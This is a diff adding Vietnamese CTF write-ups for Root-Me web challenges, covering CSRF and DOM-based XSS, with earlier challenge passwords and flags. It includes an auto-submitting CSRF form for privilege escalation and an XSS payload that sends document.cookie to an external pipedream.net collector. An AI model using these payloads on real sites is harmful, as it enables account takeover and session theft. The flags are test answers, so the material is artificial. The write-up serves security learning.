@@ -174,7 +174,52 @@ Password: 786OsErtk12
 ```js
 Password: NkI9qe4cdLIO2P7MIsWS8ofD6
 ```
+## 13. 	CSRF - 0 protection
+- Đầu tiên đăng kí tài khoản admin/admin thì vô phần private thì vì mình là user nên không có quyền đọc.
+- Có một form update profile để tăng quyền lên admin nhưng mình không có quyền thay đổi status.
+- Chèn form submit vào phần comment để gửi cho admin đọc lừa admin ấn vô submit là lên quyền.
+```js
+<form id="form" action="http://challeng01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">                    
+    <input type="text" name="username" value="admin">
+    <input type="checkbox" value="on" name="status" checked>
+</form>
+<script>
+    document.getElementById("form").submit()
+</script>
+```
+```js
+Good job dude, flag is : Csrf_Fr33style-L3v3l1!
+```
+## 15. 	XSS DOM Based - Introduction
+- Đầu tiên thấy cho 1 input đầu với number được code như sau.
+```js
+<script>
+    var random = Math.random() * (99);
+    var number = '100'; // input đầu vào
+    if(random == number) {
+        document.getElementById('state').style.color = 'green';
+        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
+    }
+    else{
+        document.getElementById('state').style.color = 'red';
+        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
+    }
+    </script>
+```
+- XSS thử xem với 
+```js
+number = '; alert(1)//
+- Thì bị dính XSS
+```
+- Vậy dùng requestbin tạo request bắt cookie là được.
+```js
+payload: 
+http://challenge01.root-me.org/web-client/ch32/index.php?number=';document.location.href='https://eo4sv9ka4dlw5ll.m.pipedream.net/?flag='.concat(document.cookie);//
+```
+```js
+flag: 
+flag=rootme{XSS_D0M_BaSed_InTr0}
 
-
+```
 
 
